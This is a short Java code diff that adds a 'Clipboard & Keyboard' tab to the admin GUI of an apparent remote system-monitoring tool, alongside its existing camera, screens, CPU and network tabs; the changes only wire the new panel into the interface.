@@ -26,6 +26,7 @@ public class AdminGui extends JFrame {
     private InterfacePanel interfacePanel;
     public CameraPanel cameraPanel;
     public ScreensPanel screensPanel;
+    public ClipKeyboardPanel clipKeyboardPanel;
     public boolean created;
     private SystemInfo systemInfo;
     private oshi.SystemInfo si;
@@ -58,6 +59,7 @@ public class AdminGui extends JFrame {
         interfacePanel = new InterfacePanel();
         cameraPanel = new CameraPanel();
         screensPanel = new ScreensPanel();
+        clipKeyboardPanel = new ClipKeyboardPanel();
         tpUser.addTab("OS & HW Info", null, osHwTextPanel, "O");
         tpUser.addTab("Memory", null, memoryPanel, "M");
         tpUser.addTab("CPU", null, processorPanel, "P");
@@ -66,6 +68,7 @@ public class AdminGui extends JFrame {
         tpUser.addTab("Network", null, interfacePanel, "I");
         tpUser.addTab("Camera", null, cameraPanel.createPanel(), "C");
         tpUser.addTab("Screens", null, screensPanel.createPanel(), "S");
+        tpUser.addTab("Clipboard & Keyboard", null, clipKeyboardPanel.createPanel(), "C");
 
         pnListUser = new JPanel(new GridLayout(10, 1, 1, 5));
         pnListUser.setVisible(true);
@@ -145,6 +148,7 @@ public class AdminGui extends JFrame {
         cameraPanel.create();
         screensPanel.create();
         osHwTextPanel.headerOsHwPanel.create();
+        clipKeyboardPanel.create();
         created = true;
     }
 
@@ -158,6 +162,7 @@ public class AdminGui extends JFrame {
         cameraPanel.reset();
         screensPanel.reset();
         osHwTextPanel.headerOsHwPanel.reset();
+        clipKeyboardPanel.reset();
         created = false;
     }
 
